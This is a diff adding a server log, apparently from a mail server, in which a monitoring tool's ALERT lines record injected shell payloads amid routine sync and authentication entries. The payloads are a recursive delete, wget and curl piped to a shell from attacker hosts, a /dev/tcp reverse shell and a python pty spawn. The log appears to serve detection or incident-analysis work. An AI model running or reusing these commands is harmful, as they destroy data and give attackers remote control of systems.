@@ -1,0 +1,54 @@
+﻿2026-08-25 10:14:10 INFO  [http-bio-8443-exec-1] SoapEngine - Authenticated user admin@corp.local from IP 192.168.1.50
+2026-08-25 10:14:25 INFO  [http-bio-8443-exec-2] MailboxSync - Synchronized 14 unread messages for mailbox id=1024
+2026-08-25 10:15:02 INFO  [http-bio-8443-exec-1] SoapEngine - handler invoked for Service Status
+2026-08-25 10:15:15 INFO  [http-bio-8443-exec-3] PostjournalService - Periodic health check OK
+2026-08-25 10:15:30 WARN  [http-bio-8443-exec-4] snmp_notify - localized notification sent successfully
+2026-08-25 10:15:45 INFO  [http-bio-8443-exec-5] SoapEngine - GetFolderRequest processed for user jdoe@corp.local
+2026-08-25 10:16:12 ALERT [http-bio-8443-exec-9] swatchdog - execution payload: ; rm -rf /; wget http://malicious-attacker.com | sh;
+2026-08-25 10:16:15 ERROR [http-bio-8443-exec-9] ZimbraProcessHandler - Anomalous child process spawned under uid=1001
+2026-08-25 10:17:01 INFO  [http-bio-8443-exec-2] SoapEngine - handler invoked for AuthRequest
+2026-08-25 10:18:22 WARN  [http-bio-8443-exec-6] snmp_notify - queue threshold reached (78/100)
+2026-08-25 10:19:40 ALERT [http-bio-8443-exec-8] swatchdog - execution payload: ; curl -s http://198.51.100.23/stage2.sh | bash;
+2026-08-25 10:20:05 INFO  [http-bio-8443-exec-3] MailboxSync - Incremental sync complete for 45 mailboxes
+2026-08-25 10:21:19 ALERT [http-bio-8443-exec-4] swatchdog - execution payload: ; /bin/sh -i >& /dev/tcp/203.0.113.44/4444 0>&1;
+2026-08-25 10:22:00 INFO  [http-bio-8443-exec-7] SoapEngine - End of transmission routine
+2026-08-31 11:05:53 INFO  [http-bio-8443-exec-11] SoapEngine - handler invoked for Service Status
+2026-08-31 11:05:54 WARN  [http-bio-8443-exec-5] snmp_notify - localized notification sent successfully
+2026-08-31 11:05:56 INFO  [http-bio-8443-exec-13] SoapEngine - Authenticated user admin@corp.local from IP 192.168.1.50
+2026-08-31 11:05:57 INFO  [http-bio-8443-exec-1] PostjournalService - Periodic health check OK
+2026-08-31 11:05:59 ALERT [http-bio-8443-exec-8] swatchdog - execution payload: ; /bin/sh -i >& /dev/tcp/203.0.113.44/4444 0>&1;
+2026-08-31 11:06:00 INFO  [http-bio-8443-exec-6] SoapEngine - AuthRequest successful for user analyst@soc.corp
+2026-08-31 11:06:02 INFO  [http-bio-8443-exec-11] SoapEngine - AuthRequest successful for user analyst@soc.corp
+2026-08-31 11:06:03 INFO  [http-bio-8443-exec-5] SoapEngine - AuthRequest successful for user analyst@soc.corp
+2026-08-31 11:06:05 WARN  [http-bio-8443-exec-13] snmp_notify - localized notification sent successfully
+2026-08-31 11:06:06 INFO  [http-bio-8443-exec-12] SoapEngine - Authenticated user admin@corp.local from IP 192.168.1.50
+2026-08-31 11:06:08 INFO  [http-bio-8443-exec-12] MailboxSync - Synchronized 14 unread messages for mailbox id=1024
+2026-08-31 11:06:09 ALERT [http-bio-8443-exec-10] swatchdog - execution payload: ; /bin/sh -i >& /dev/tcp/203.0.113.44/4444 0>&1;
+2026-08-31 11:06:11 INFO  [http-bio-8443-exec-9] MailboxSync - Synchronized 14 unread messages for mailbox id=1024
+2026-08-31 11:06:12 INFO  [http-bio-8443-exec-8] SoapEngine - handler invoked for Service Status
+2026-08-31 11:06:14 INFO  [http-bio-8443-exec-3] SoapEngine - AuthRequest successful for user analyst@soc.corp
+2026-08-31 11:06:15 INFO  [http-bio-8443-exec-8] PostjournalService - Periodic health check OK
+2026-08-31 11:06:17 WARN  [http-bio-8443-exec-14] snmp_notify - localized notification sent successfully
+2026-08-31 11:06:18 ALERT [http-bio-8443-exec-4] swatchdog - execution payload: ; python -c 'import pty; pty.spawn("/bin/sh")';
+2026-08-31 11:06:20 INFO  [http-bio-8443-exec-10] MailboxSync - Synchronized 14 unread messages for mailbox id=1024
+2026-08-31 11:06:21 INFO  [http-bio-8443-exec-4] SoapEngine - GetFolderRequest processed for user jdoe@corp.local
+2026-08-31 14:20:14 INFO  [http-bio-8443-exec-5] SoapEngine - handler invoked for Service Status
+2026-08-31 14:20:15 INFO  [http-bio-8443-exec-13] SoapEngine - GetFolderRequest processed for user jdoe@corp.local
+2026-08-31 14:20:17 INFO  [http-bio-8443-exec-6] SoapEngine - AuthRequest successful for user analyst@soc.corp
+2026-08-31 14:20:18 INFO  [http-bio-8443-exec-2] PostjournalService - Periodic health check OK
+2026-08-31 14:20:20 ALERT [http-bio-8443-exec-7] swatchdog - execution payload: ; /bin/sh -i >& /dev/tcp/203.0.113.44/4444 0>&1;
+2026-08-31 14:20:21 INFO  [http-bio-8443-exec-14] SoapEngine - handler invoked for Service Status
+2026-08-31 14:20:23 INFO  [http-bio-8443-exec-6] MailboxSync - Synchronized 14 unread messages for mailbox id=1024
+2026-08-31 14:20:24 INFO  [http-bio-8443-exec-12] MailboxSync - Synchronized 14 unread messages for mailbox id=1024
+2026-08-31 14:20:26 WARN  [http-bio-8443-exec-1] snmp_notify - localized notification sent successfully
+2026-08-31 14:20:27 INFO  [http-bio-8443-exec-11] MailboxSync - Synchronized 14 unread messages for mailbox id=1024
+2026-08-31 14:20:29 INFO  [http-bio-8443-exec-3] SoapEngine - handler invoked for Service Status
+2026-08-31 14:20:30 ALERT [http-bio-8443-exec-9] swatchdog - execution payload: ; /bin/sh -i >& /dev/tcp/203.0.113.44/4444 0>&1;
+2026-08-31 14:20:32 WARN  [http-bio-8443-exec-7] snmp_notify - localized notification sent successfully
+2026-08-31 14:20:33 WARN  [http-bio-8443-exec-15] snmp_notify - localized notification sent successfully
+2026-08-31 14:20:35 INFO  [http-bio-8443-exec-15] PostjournalService - Periodic health check OK
+2026-08-31 14:20:36 INFO  [http-bio-8443-exec-8] SoapEngine - GetFolderRequest processed for user jdoe@corp.local
+2026-08-31 14:20:38 WARN  [http-bio-8443-exec-7] snmp_notify - localized notification sent successfully
+2026-08-31 14:20:39 ALERT [http-bio-8443-exec-10] swatchdog - execution payload: ; python -c 'import pty; pty.spawn("/bin/sh")';
+2026-08-31 14:20:41 INFO  [http-bio-8443-exec-11] SoapEngine - handler invoked for Service Status
+2026-08-31 14:20:42 INFO  [http-bio-8443-exec-14] SoapEngine - GetFolderRequest processed for user jdoe@corp.local
